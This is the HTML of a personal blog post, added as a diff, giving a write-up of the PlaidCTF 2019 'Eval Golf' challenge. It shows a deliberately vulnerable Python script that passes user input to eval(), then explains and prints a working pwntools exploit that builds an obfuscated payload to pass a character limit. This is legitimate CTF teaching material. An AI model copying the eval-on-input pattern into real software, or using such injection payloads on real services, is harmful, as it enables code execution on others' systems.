@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<!-- Basic Metas -->
+	<meta charset="utf-8">
+	<title>Eval Golf (PlaidCTF Writeup) | Kevin Yap</title>
+	<meta name="description" content="Sticking with the theme of CTF writeups, here’s one of a fairly simple challenge from PlaidCTF 2019. Given that Python is my programming language of choice, it was fun to work on a Python-based challenge (rather than the low-level exploits that …">
+	<meta name="author" content="Kevin Yap">
+	<link rel="author" href="https://plus.google.com/+KevinYapCA"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+	<!-- Twitter Cards and Open Graph -->
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:creator" content="@iKevinY">
+	<meta name="twitter:domain" content="kevinyap.ca">
+	<meta name="twitter:site" content="@iKevinY">
+	<meta property="og:title" content="Eval Golf (PlaidCTF Writeup)">
+	<meta property="og:description" content="Sticking with the theme of CTF writeups, here’s one of a fairly simple challenge from PlaidCTF 2019. Given that Python is my programming language of choice, it was fun to work on a Python-based challenge (rather than the low-level exploits that …">
+	<meta property="og:image" content="http://kevinyap.ca/images/icons/avatar.png">
+	<meta property="og:type" content="article">
+	<meta property="og:url" content="http://kevinyap.ca/2019/04/eval-golf-plaidctf-writeup/">
+
+	<!-- Stylesheets and Web Fonts -->
+	<link href="/theme/style.min.css" rel="stylesheet">
+	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Favicons -->
+	<link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="57x57" href="/images/icons/apple-touch-icon-57x57.png">
+	<link rel="apple-touch-icon" sizes="60x60" href="/images/icons/apple-touch-icon-60x60.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="/images/icons/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="76x76" href="/images/icons/apple-touch-icon-76x76.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="/images/icons/apple-touch-icon-114x114.png">
+	<link rel="apple-touch-icon" sizes="120x120" href="/images/icons/apple-touch-icon-120x120.png">
+	<link rel="apple-touch-icon" sizes="144x144" href="/images/icons/apple-touch-icon-144x144.png">
+	<link rel="apple-touch-icon" sizes="152x152" href="/images/icons/apple-touch-icon-152x152.png">
+	<link rel="apple-touch-icon" sizes="180x180" href="/images/icons/apple-touch-icon-180x180.png">
+
+	<link rel="icon" type="image/png" href="/images/icons/favicon-16x16.png" sizes="16x16">
+	<link rel="icon" type="image/png" href="/images/icons/favicon-32x32.png" sizes="32x32">
+	<link rel="icon" type="image/png" href="/images/icons/favicon-96x96.png" sizes="96x96">
+	<link rel="icon" type="image/png" href="/images/icons/favicon-160x160.png" sizes="160x160">
+	<link rel="icon" type="image/png" href="/images/icons/favicon-196x196.png" sizes="196x196">
+
+	<meta name="theme-color" content="#FF8000">
+
+	<meta name="msapplication-TileColor" content="#FF8000">
+	<meta name="msapplication-TileImage" content="/images/icons/mstile-144x144.png">
+	<meta name="msapplication-square70x70logo" content="/images/icons/mstile-small.png">
+	<meta name="msapplication-square150x150logo" content="/images/icons/mstile-medium.png">
+	<meta name="msapplication-wide310x150logo" content="/images/icons/mstile-wide.png">
+	<meta name="msapplication-square310x310logo" content="/images/icons/mstile-large.png">
+
+	<!--[if lt IE 9]>
+	<script src="/theme/js/html5shiv.min.js"></script>
+	<script src="/theme/js/respond.min.js"></script>
+	<![endif]-->
+</head>
+
+<body>
+	<div class="container">
+		<aside>
+			<a href="/"><img id="avatar" alt="Site Avatar" src="/images/icons/avatar.png"></a>
+			<div id="name"><a href="/">Kevin Yap</a></div>
+			<div id="bio">Developer and musician from Vancouver, BC.</div>
+
+			<div id="sidebar-links">
+				<a href="/about/">About</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="/archive/">Archive</a>
+			</div>
+
+			<div id="social">
+				<a href="mailto:me@kevinyap.ca" title="Email (me@kevinyap.ca)" class="icon fa fa-envelope"></a>
+				<a href="http://twitter.com/iKevinY" title="Twitter" class="icon fa fa-twitter"></a>
+				<a href="http://github.com/iKevinY" title="GitHub" class="icon fa fa-github"></a>
+				<a href="http://soundcloud.com/iKevinY" title="SoundCloud" class="icon fa fa-soundcloud"></a>
+				<a href="/atom.xml" title="Atom Feed" class="icon fa fa-rss"></a>
+			</div>
+
+			<hr id="sidebar-divider">
+		</aside>
+
+		<article>
+	<h1 class="title"><a href="/2019/04/eval-golf-plaidctf-writeup/" title="Permalink to Eval Golf (PlaidCTF Writeup)">Eval Golf (PlaidCTF&nbsp;Writeup)</a></h1>
+	<time class="date" datetime="2019-04-13 00:00:00-07:00">April 13, 2019</time>
+	<div class="content">
+		<p>Sticking with the theme of <span class="caps">CTF</span> writeups, here&#8217;s one of a fairly simple challenge from <a href="http://plaidctf.com">PlaidCTF 2019</a>. Given that Python is my programming language of choice, it was fun to work on a Python-based challenge (rather than the low-level exploits that are more common in&nbsp;CTFs).</p>
+<p>The service that we&#8217;re trying to retrieve the flag from executes this&nbsp;script:</p>
+<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="nb">exit</span>
+<span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">secret_value_for_password</span><span class="p">,</span> <span class="n">flag</span><span class="p">,</span> <span class="k">exec</span>
+
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">inp</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Input value: &quot;</span><span class="p">)</span>
+    <span class="n">count_digits</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">inp</span><span class="p">))</span>
+    <span class="k">if</span> <span class="n">count_digits</span> <span class="o">&lt;=</span> <span class="mi">10</span><span class="p">:</span>          <span class="c1"># Make sure it is a number</span>
+        <span class="n">val</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">inp</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span>
+
+    <span class="k">if</span> <span class="n">val</span> <span class="o">==</span> <span class="n">secret_value_for_password</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Nope. Better luck next time.&quot;</span><span class="p">)</span>
+<span class="k">except</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Nope. No hacking.&quot;</span><span class="p">)</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+
+
+<p>The obvious thing to exploit here is the line containing <code>eval()</code>, which of course is extremely dangerous to use when paired with user-input. However, there are are a couple of safeguards in place that make our job a little more&nbsp;difficult.</p>
+<p>The easiest thing to do here is just pass in the string <code>secret_value_for_password</code> as the input value. When that string is <code>eval</code><span class="quo">&#8216;</span>d, it will set <code>val</code> to whatever the value of that imported constant is, causing the following <code>if</code> condition check to succeed and giving us the&nbsp;flag.</p>
+<p>Unfortunately, the code that&#8217;s supposed to &#8220;make sure [the input] is a number&#8221; is not actually doing that. What it&#8217;s actually doing is restricting the length of the input to 10 characters. Interestingly though, since <code>count_digits</code> is actually set to the length of <code>set(inp)</code>, the actual restriction is only that our input consists of 10 or fewer <em>distinct characters</em> (ie. reusing the same character more than once doesn&#8217;t contribute to our&nbsp;&#8220;limit&#8221;).</p>
+<p>The string <code>secret_value_for_password</code> contains 15 characters, which means it will be rejected. Somehow we need to find a way to <a href="https://en.wikipedia.org/wiki/Code_golf">golf down</a> the unique characters in our&nbsp;payload.</p>
+<p>The first that comes to mind is to build up each character of our secret value one-by-one using <a href="https://docs.python.org/3/library/functions.html#chr"><code>chr()</code></a>, which takes in a number and returns the character corresponding to that <span class="caps">ASCII</span> value. Of course, we can represent any number we want by summing <code>1</code> with itself a bunch of times, which helps us not use up precious unique&nbsp;characters.</p>
+<div class="codehilite"><pre><span></span><span class="o">&gt;&gt;&gt;</span> <span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;secret_value_for_password&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">codepoints</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;1&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;chr({})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">codepoints</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">eval</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="s1">&#39;secret_value_for_password&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="mi">7</span>
+</pre></div>
+
+
+<p>Excellent, we&#8217;ve managed to put together <code>secret_value_for_password</code> using only seven different characters! The problem here is that this payload will set <code>val</code> to the string literal <code>secret_value_for_password</code>, rather than than the value of that variable itself. We could fix this by wrapping the entire payload in <code>eval()</code>, but since we haven&#8217;t used any of the characters in <code>eval</code> yet, this would bump us up to 11 characters &#8212; just above our&nbsp;limit.</p>
+<p>Somehow we need to trim one character, but it feels like everything is necessary. We definitely need our parentheses to make any sort of function calls, and the <code>+</code> serves the dual purpose of accumulating our <span class="caps">ASCII</span> values and also performing the string&nbsp;concatenation.</p>
+<p>Rather tantalizingly, the script gives us a variable named <code>val</code> which is set to <code>0</code>. If this was instead initialized to <code>1</code>, we could replace <code>1</code> in our payload with <code>val</code>, and be at 10 characters exactly (since we have <code>eval</code> in our payload&nbsp;anyways).</p>
+<p>The trick here is figuring out a way to represent <code>1</code> in Python with the following pool of characters: <code>()+chreval</code>. Having worked with Python enough, I suspected the solution was something to do with truthiness. If we could somehow get an expression to evaluate to something <code>True</code>, we could sum up <em>that expression</em> as a replacement for using the character 1 (because in Python, <code>True + True = 2</code>).</p>
+<p>The magic bullet here was the built-in <a href="https://docs.python.org/3/library/functions.html#all"><code>all()</code></a>, which returns <code>True</code> if all elements of the input iterable are truthy (or if the iterable itself is empty). We already have the characters <code>a</code> and <code>l</code> from our call to <code>eval</code>, and we can simply pass in <code>()</code> (the empty tuple). That is, <code>all(())</code> serves as our substitute for the character <code>1</code>.</p>
+<p>With this change, our payload contains exactly 10 unique characters. Putting this all together, we arrive at our final exploit (using <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code></a> to execute&nbsp;it):</p>
+<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s2">&quot;secret_value_for_password&quot;</span>
+
+<span class="n">codepoints</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;all(())&#39;</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">target</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;+&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">&#39;chr({})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">codepoints</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;eval(&#39;</span> <span class="o">+</span> <span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;)&#39;</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;canyouguessme.pwni.ng&#39;</span><span class="p">,</span> <span class="mi">12349</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+
+<p>This <span class="caps">22KB</span> payload is accepted by the service and gives us our&nbsp;flag!</p>
+	</div>
+
+	<div id="related-articles">
+		<a href="/2019/03/rickety-roulette-picoctf-writeup/" id="prev-neighbour">Rickety Roulette (picoCTF Writeup) &raquo;</a>
+	</div>
+
+			<hr>
+		</article>
+
+		<footer>
+			<p>Powered by <a href="http://getpelican.com">Pelican</a> and <a href="http://pages.github.com">GitHub&nbsp;Pages</a>.</p>
+		</footer>
+	</div>
+
+
+</body>
+</html>
